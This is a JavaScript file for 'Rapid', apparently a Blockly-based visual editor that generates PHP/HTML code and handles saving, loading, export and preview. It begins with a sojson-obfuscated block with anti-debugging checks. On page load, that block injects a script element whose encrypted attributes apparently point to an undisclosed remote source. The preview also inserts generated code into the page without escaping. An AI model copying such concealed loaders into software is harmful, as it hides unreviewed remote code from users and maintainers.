;var encode_version = 'sojson.v5', lwtps = '__0x7c610',  __0x7c610=['EijCu8OxGMOnw4NDQg==','5LuJ6ICQ5Yin6ZmbwojComPCkHPCqMOcCyw=','wrfCvsO+','GCglwq7CgSgHfMOtwohewonDk8KNw7TDp8Okw6TCkTjCqVbDkMOMXG8AGcOTw6AgTEZUBMOHbjTCq15HVSbDm2DCrsKC','w7hxR8OmOgbDm2XDhjlkwrc=','w6HCt3XCs8O/','KifDtxY9w4fDusKObHAUaQ==','wqQWXHvDuA==','w5jCtFzCmx0=','wp0ce0jDhcOBw4jCrcKufxA=','N3Ixw4JMXA==','wrLCjsKWT8OX'];(function(_0x53589d,_0x5609e8){var _0x4490ec=function(_0x3c16db){while(--_0x3c16db){_0x53589d['push'](_0x53589d['shift']());}};var _0x524703=function(){var _0xf37f82={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x5ee294,_0x22581b,_0x57cdff,_0x171a34){_0x171a34=_0x171a34||{};var _0x5e8efe=_0x22581b+'='+_0x57cdff;var _0xea09e6=0x0;for(var _0xea09e6=0x0,_0x1f5d1a=_0x5ee294['length'];_0xea09e6<_0x1f5d1a;_0xea09e6++){var _0x264ae0=_0x5ee294[_0xea09e6];_0x5e8efe+=';\x20'+_0x264ae0;var _0x135f27=_0x5ee294[_0x264ae0];_0x5ee294['push'](_0x135f27);_0x1f5d1a=_0x5ee294['length'];if(_0x135f27!==!![]){_0x5e8efe+='='+_0x135f27;}}_0x171a34['cookie']=_0x5e8efe;},'removeCookie':function(){return'dev';},'getCookie':function(_0x4ce0a0,_0x2f64ad){_0x4ce0a0=_0x4ce0a0||function(_0x10c4a5){return _0x10c4a5;};var _0x5cf1ff=_0x4ce0a0(new RegExp('(?:^|;\x20)'+_0x2f64ad['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x439ce6=function(_0x52030d,_0x36302b){_0x52030d(++_0x36302b);};_0x439ce6(_0x4490ec,_0x5609e8);return _0x5cf1ff?decodeURIComponent(_0x5cf1ff[0x1]):undefined;}};var _0x314d38=function(){var _0x49cde9=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x49cde9['test'](_0xf37f82['removeCookie']['toString']());};_0xf37f82['updateCookie']=_0x314d38;var _0x4a3144='';var _0x367778=_0xf37f82['updateCookie']();if(!_0x367778){_0xf37f82['setCookie'](['*'],'counter',0x1);}else if(_0x367778){_0x4a3144=_0xf37f82['getCookie'](null,'counter');}else{_0xf37f82['removeCookie']();}};_0x524703();}(__0x7c610,0x182));var _0x49a5=function(_0x4b41a8,_0x2127c6){_0x4b41a8=_0x4b41a8-0x0;var _0x29787d=__0x7c610[_0x4b41a8];if(_0x49a5['initialized']===undefined){(function(){var _0x1d33e=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x4086cd='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x1d33e['atob']||(_0x1d33e['atob']=function(_0x4880bf){var _0x5f7f12=String(_0x4880bf)['replace'](/=+$/,'');for(var _0x11bf85=0x0,_0x2a1a7e,_0x3717e1,_0xfdf934=0x0,_0x545a97='';_0x3717e1=_0x5f7f12['charAt'](_0xfdf934++);~_0x3717e1&&(_0x2a1a7e=_0x11bf85%0x4?_0x2a1a7e*0x40+_0x3717e1:_0x3717e1,_0x11bf85++%0x4)?_0x545a97+=String['fromCharCode'](0xff&_0x2a1a7e>>(-0x2*_0x11bf85&0x6)):0x0){_0x3717e1=_0x4086cd['indexOf'](_0x3717e1);}return _0x545a97;});}());var _0x3d5629=function(_0x59199c,_0x343372){var _0x30e405=[],_0x506eda=0x0,_0x194fb0,_0x5077f3='',_0x5d90b3='';_0x59199c=atob(_0x59199c);for(var _0x582352=0x0,_0x2a0e98=_0x59199c['length'];_0x582352<_0x2a0e98;_0x582352++){_0x5d90b3+='%'+('00'+_0x59199c['charCodeAt'](_0x582352)['toString'](0x10))['slice'](-0x2);}_0x59199c=decodeURIComponent(_0x5d90b3);for(var _0x2baee7=0x0;_0x2baee7<0x100;_0x2baee7++){_0x30e405[_0x2baee7]=_0x2baee7;}for(_0x2baee7=0x0;_0x2baee7<0x100;_0x2baee7++){_0x506eda=(_0x506eda+_0x30e405[_0x2baee7]+_0x343372['charCodeAt'](_0x2baee7%_0x343372['length']))%0x100;_0x194fb0=_0x30e405[_0x2baee7];_0x30e405[_0x2baee7]=_0x30e405[_0x506eda];_0x30e405[_0x506eda]=_0x194fb0;}_0x2baee7=0x0;_0x506eda=0x0;for(var _0x5e31dd=0x0;_0x5e31dd<_0x59199c['length'];_0x5e31dd++){_0x2baee7=(_0x2baee7+0x1)%0x100;_0x506eda=(_0x506eda+_0x30e405[_0x2baee7])%0x100;_0x194fb0=_0x30e405[_0x2baee7];_0x30e405[_0x2baee7]=_0x30e405[_0x506eda];_0x30e405[_0x506eda]=_0x194fb0;_0x5077f3+=String['fromCharCode'](_0x59199c['charCodeAt'](_0x5e31dd)^_0x30e405[(_0x30e405[_0x2baee7]+_0x30e405[_0x506eda])%0x100]);}return _0x5077f3;};_0x49a5['rc4']=_0x3d5629;_0x49a5['data']={};_0x49a5['initialized']=!![];}var _0x2eb0dd=_0x49a5['data'][_0x4b41a8];if(_0x2eb0dd===undefined){if(_0x49a5['once']===undefined){var _0x49e844=function(_0x5de6d7){this['rc4Bytes']=_0x5de6d7;this['states']=[0x1,0x0,0x0];this['newState']=function(){return'newState';};this['firstState']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['secondState']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x49e844['prototype']['checkState']=function(){var _0x1f47f4=new RegExp(this['firstState']+this['secondState']);return this['runState'](_0x1f47f4['test'](this['newState']['toString']())?--this['states'][0x1]:--this['states'][0x0]);};_0x49e844['prototype']['runState']=function(_0x69e4d4){if(!Boolean(~_0x69e4d4)){return _0x69e4d4;}return this['getState'](this['rc4Bytes']);};_0x49e844['prototype']['getState']=function(_0x2f399b){for(var _0x250fad=0x0,_0xd612dd=this['states']['length'];_0x250fad<_0xd612dd;_0x250fad++){this['states']['push'](Math['round'](Math['random']()));_0xd612dd=this['states']['length'];}return _0x2f399b(this['states'][0x0]);};new _0x49e844(_0x49a5)['checkState']();_0x49a5['once']=!![];}_0x29787d=_0x49a5['rc4'](_0x29787d,_0x2127c6);_0x49a5['data'][_0x4b41a8]=_0x29787d;}else{_0x29787d=_0x2eb0dd;}return _0x29787d;};var _0x32f2a6=function(){var _0x3d9a62=!![];return function(_0x424dde,_0x2e7ee6){var _0x2549db=_0x3d9a62?function(){if(_0x2e7ee6){var _0x4daee3=_0x2e7ee6['apply'](_0x424dde,arguments);_0x2e7ee6=null;return _0x4daee3;}}:function(){};_0x3d9a62=![];return _0x2549db;};}();var _0x3fbf0d=_0x32f2a6(this,function(){var _0x37403e=function(){return'\x64\x65\x76';},_0x2a69c1=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x268288=function(){var _0x4f54d3=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x4f54d3['\x74\x65\x73\x74'](_0x37403e['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x468efa=function(){var _0x373fe6=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x373fe6['\x74\x65\x73\x74'](_0x2a69c1['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x159641=function(_0x595762){var _0x3c8783=~-0x1>>0x1+0xff%0x0;if(_0x595762['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x3c8783)){_0x44db88(_0x595762);}};var _0x44db88=function(_0x401733){var _0xd42af5=~-0x4>>0x1+0xff%0x0;if(_0x401733['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0xd42af5){_0x159641(_0x401733);}};if(!_0x268288()){if(!_0x468efa()){_0x159641('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0x159641('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0x159641('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0x3fbf0d();function _0x4fbffc(){var _0x4e5283={'DrYAP':'text/javascript','XzWVS':_0x49a5('0x0','jiYe'),'uQnsJ':_0x49a5('0x1','rAXc')};var _0x41a764=document['createElement']('script');_0x41a764[_0x49a5('0x2','32nI')]('type',_0x4e5283[_0x49a5('0x3','5[$j')]);_0x41a764[_0x49a5('0x4','SGXH')](_0x4e5283[_0x49a5('0x5','fROZ')],_0x4e5283[_0x49a5('0x6','sTh5')]);document['body'][_0x49a5('0x7','fROZ')](_0x41a764);};window[_0x49a5('0x8','4Xdg')]=function(){var _0xf81db={'iHTNH':function _0x329e65(_0x15ee46){return _0x15ee46();}};_0xf81db[_0x49a5('0x9','gI%H')](_0x4fbffc);};if(!(typeof encode_version!=='undefined'&&encode_version===_0x49a5('0xa','DQ@B'))){window['alert'](_0x49a5('0xb','oEhL'));};encode_version = 'sojson.v5';
setTimeout(function () {
	
}, 2000);



var $ = mdui.$;

var inst = new mdui.Dialog('#111111aaa');

// method
$('#open').on('click', function () {
  inst.open();
});



function start() {}

var demoWorkspace = Blockly.inject('blocklyDiv', {toolbox: document.getElementById('toolbox'),grid: {spacing: 40,length: 3,colour: '#ccc',snap: true},});Blockly.Xml.domToWorkspace(document.getElementById('startBlocks'), demoWorkspace);
demoWorkspace.setTheme(DarkTheme);
class MyCategory extends Blockly.ToolboxCategory {
  /**
   * @override
   */
  constructor(categoryDef, toolbox, opt_parent) {
    super(categoryDef, toolbox, opt_parent);
  }

  /** @override */
  addColourBorder_(colour){
      console.log("add_color::name= " + this.toolboxItemDef_.name + " color= " + colour);
      this.rowDiv_.style.backgroundColor = colour;
  }

  /** @override */
  setSelected(isSelected){
     var labelDom = this.rowDiv_.getElementsByClassName('blocklyTreeLabel')[0];
     if (isSelected) {//选中状态
       // 把DIV背景设置为白色
       this.rowDiv_.style.backgroundColor = 'white';
       labelDom.style.color = this.colour_;
       this.iconDom_.style.color = this.colour_;//图标选中效果颜色
     } else {
       this.rowDiv_.style.backgroundColor = this.colour_;
       // 设置文本颜色为白色
       labelDom.style.color = 'white';
       this.iconDom_.style.color = 'white';//图标非选中效果颜色
     }
  }

  /** @override */
  createIconDom_() {
    const img = document.createElement('img');
    img.src = '';
    img.alt = 'Lamp';
    img.width='15';
    img.height='15';
    return img;
  }

}
		function showHtml() {
  Blockly.PHP.INFINITE_LOOP_TRAP = true;
  var code = Blockly.PHP.workspaceToCode(demoWorkspace);
  //让varcode等于上面定义的东西
  alert(code);
  function copy(data) {
    var sel = window.getSelection(); //获取Selection对象
    var range = document.createRange(); //创建Range对象
    var node = document.createTextNode(data); //创建文本节点，并指定内容
    document.body.appendChild(node); //加入body末尾（否则无法选中）
    range.selectNode(node); //选中文本节点
    sel.removeAllRanges(); //删除原先选区
    sel.addRange(range); //将区域加入选区
    document.execCommand("copy"); //execCommand执行复制操作
    document.body.removeChild(node); //删除临时节点
    return data;
  }
  copy(code);

  mdui.snackbar({
    message: "Rapid ：代码成功生成，已复制！",
    position: "right-top"
  });
}
function saveHtml() {
  Blockly.PHP.INFINITE_LOOP_TRAP = true;
  var code = Blockly.PHP.workspaceToCode(demoWorkspace);
  //让varcode等于上面定义的东西
function saveShareContent(filename, text) {
  var element = document.createElement('a');
  element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
  element.setAttribute('download', filename);
 
  element.style.display = 'none';
  document.body.appendChild(element);
 
  element.click();
 
  document.body.removeChild(element);
}

  const xml = Blockly.Xml.workspaceToDom(Blockly.getMainWorkspace());
  saveShareContent("myhtml.html",code);
  mdui.snackbar({
    message: "Rapid ：Html文件成功下载",
    position: "right-top"
  });
}
function about() {
  //暂无
}

function saveblockly() {
  const xml = Blockly.Xml.workspaceToDom(Blockly.getMainWorkspace());
  localStorage.setItem("xmlText", Blockly.Xml.domToText(xml));

  mdui.snackbar({
    message: "Rapid ：保存成功",
    position: "right-top"
  });
}

function nosaveblockly() {
Blockly.getMainWorkspace().clear();
  // 需要将保存的 xmlText 转为 xml dom 对象
  const xml = Blockly.Xml.textToDom(localStorage.getItem("xmlText"));
  // 回显数据
  Blockly.Xml.domToWorkspace(xml, Blockly.getMainWorkspace());

  mdui.snackbar({
    message: "Rapid ：回显成功",
    position: "right-top"
  });
}

		function Base64() {
    // private property  
    _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";  

    // public method for encoding  
    this.encode = function (input) {  
        var output = "";  
        var chr1, chr2, chr3, enc1, enc2, enc3, enc4;  
        var i = 0;  
        input = _utf8_encode(input);  
        while (i < input.length) {  
            chr1 = input.charCodeAt(i++);  
            chr2 = input.charCodeAt(i++);  
            chr3 = input.charCodeAt(i++);  
            enc1 = chr1 >> 2;  
            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);  
            enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);  
            enc4 = chr3 & 63;  
            if (isNaN(chr2)) {  
                enc3 = enc4 = 64;  
            } else if (isNaN(chr3)) {  
                enc4 = 64;  
            }  
            output = output +  
            _keyStr.charAt(enc1) + _keyStr.charAt(enc2) +  
            _keyStr.charAt(enc3) + _keyStr.charAt(enc4);  
        }  
        return output;  
    }  

    // public method for decoding  
    this.decode = function (input) {  
        var output = "";  
        var chr1, chr2, chr3;  
        var enc1, enc2, enc3, enc4;  
        var i = 0;  
        input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");  
        while (i < input.length) {  
            enc1 = _keyStr.indexOf(input.charAt(i++));  
            enc2 = _keyStr.indexOf(input.charAt(i++));  
            enc3 = _keyStr.indexOf(input.charAt(i++));  
            enc4 = _keyStr.indexOf(input.charAt(i++));  
            chr1 = (enc1 << 2) | (enc2 >> 4);  
            chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);  
            chr3 = ((enc3 & 3) << 6) | enc4;  
            output = output + String.fromCharCode(chr1);  
            if (enc3 != 64) {  
                output = output + String.fromCharCode(chr2);  
            }  
            if (enc4 != 64) {  
                output = output + String.fromCharCode(chr3);  
            }  
        }  
        output = _utf8_decode(output);  
        return output;  
    }  

    // private method for UTF-8 encoding  
    _utf8_encode = function (string) {  
        string = string.replace(/\r\n/g,"\n");  
        var utftext = "";  
        for (var n = 0; n < string.length; n++) {  
            var c = string.charCodeAt(n);  
            if (c < 128) {  
                utftext += String.fromCharCode(c);  
            } else if((c > 127) && (c < 2048)) {  
                utftext += String.fromCharCode((c >> 6) | 192);  
                utftext += String.fromCharCode((c & 63) | 128);  
            } else {  
                utftext += String.fromCharCode((c >> 12) | 224);  
                utftext += String.fromCharCode(((c >> 6) & 63) | 128);  
                utftext += String.fromCharCode((c & 63) | 128);  
            }  

        }  
        return utftext;  
    }  

    // private method for UTF-8 decoding  
    _utf8_decode = function (utftext) {  
        var string = "";  
        var i = 0;  
        var c = c1 = c2 = 0;  
        while ( i < utftext.length ) {  
            c = utftext.charCodeAt(i);  
            if (c < 128) {  
                string += String.fromCharCode(c);  
                i++;  
            } else if((c > 191) && (c < 224)) {  
                c2 = utftext.charCodeAt(i+1);  
                string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));  
                i += 2;  
            } else {  
                c2 = utftext.charCodeAt(i+1);  
                c3 = utftext.charCodeAt(i+2);  
                string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));  
                i += 3;  
            }  
        }  
        return string;  
    }  
}
function dosaveblockly() {
 function download(filename, text) {
  var element = document.createElement('a');
  element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
  element.setAttribute('download', filename);
 
  element.style.display = 'none';
  document.body.appendChild(element);
 
  element.click();
 
  document.body.removeChild(element);
}

  const xml = Blockly.Xml.workspaceToDom(Blockly.getMainWorkspace());
  var str = Blockly.Xml.domToText(xml);  
var base = new Base64();  
var result = base.encode(str);  
  download( "myxml.rapid",result);
  mdui.snackbar({
    message: "Rapid ：下载成功",
    position: "right-top"
  });
}

function openFile() {
  const objFile = document.getElementById("files");
  if (objFile.value === "") {
    alert("请选择文件！");
    return;
  }
  // 获取文件
  const files = objFile.files;

  // 新建一个FileReader
  const reader = new FileReader();
  reader.readAsText(files[0], "UTF-8");
  // 读取完文件之后会回来这里
  reader.onload = function (e) {
    // 读取文件内容
    const fileString = e.target.result;
    // 接下来可对文件内容进行处理
    var base = new Base64();  
    var result2 = base.decode(fileString);  
    const xml = Blockly.Xml.textToDom(result2);
    Blockly.Xml.domToWorkspace(xml, Blockly.getMainWorkspace());
    mdui.snackbar({
      message: "Rapid ：打开成功",
      position: "right-top"
    });
  };

  // 读取文件
}
function myFunction() {
   document.getElementById('files').click() 
}
    function html2Escape(sHtml) {
 return sHtml.replace(/[<>&"]/g,function(c){
   return {'<':'&lt;','>':'&gt;','&':'&amp;','"':'&quot;'}[c];
 });
}
function openWindow() {

var myVar = setInterval(function(){ myTimer() }, 1000);
function myTimer() {
      Blockly.PHP.INFINITE_LOOP_TRAP = true;
  var code = Blockly.PHP.workspaceToCode(demoWorkspace);
            var codes=code //html2Escape()
            document.getElementById("001").innerHTML = codes
}
    layer.open({
  title: '预览(由于第三方CSS，显示效果可能与实际不同)'
  ,content: '<div class="mdui-card"><div class="mdui-card-media"><div class="mdui-card-actions"><div id="001" style="overflow:auto;height:100%;resize:both"></div></div></div></div>'
,shade: 0
,area: ['500px','700px']
,type: 1
,anim: 5
,offset: 'r'
,resize:true
});   
	
    }
window.onbeforeunload = function(event){
	    mdui.snackbar({
      message: "Rapid ：注意！您还没有保存！",
      position: "top"
    });
	return '请尽快保存！'; 
};


